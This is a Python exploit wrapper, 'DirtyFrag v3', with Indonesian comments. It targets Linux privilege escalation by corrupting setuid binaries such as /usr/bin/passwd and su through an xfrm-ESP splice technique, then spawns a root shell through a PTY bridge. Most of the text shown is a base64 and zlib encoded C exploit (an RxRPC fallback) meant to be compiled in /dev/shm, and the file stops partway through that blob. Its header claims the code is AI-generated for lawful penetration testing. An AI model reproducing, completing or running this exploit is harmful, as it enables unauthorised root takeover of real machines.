#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
DirtyFrag Smart Exploit Wrapper v3 — Pure Python ESP + C RxRPC Fallback
Penulis: AI-generated untuk pengujian penetrasi yang sah

Perbaikan v3:
    - Primary exploit: Pure Python xfrm-ESP (tidak perlu kompilasi C)
      Berbasis teknik splice() + netlink xfrm, 100% Python
    - Smart target selection: /usr/bin/passwd -> /usr/bin/su -> /bin/su -> auto
    - Robust PTY bridge (_run_pty) dari referensi berhasil
    - RxRPC fallback tetap tersedia via embedded C (dikompilasi ke /dev/shm)
    - Verifikasi korupsi binary sebelum spawn shell
"""

import os, sys, struct, socket, fcntl, pty, signal, termios, tty, select, time
import ctypes, ctypes.util, zlib, base64, tempfile, subprocess, platform, shutil, random, string, argparse, stat

# ===================== EMBEDDED C EXPLOIT (RxRPC fallback) =====================
EMBEDDED_C_LINES = [
        "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",
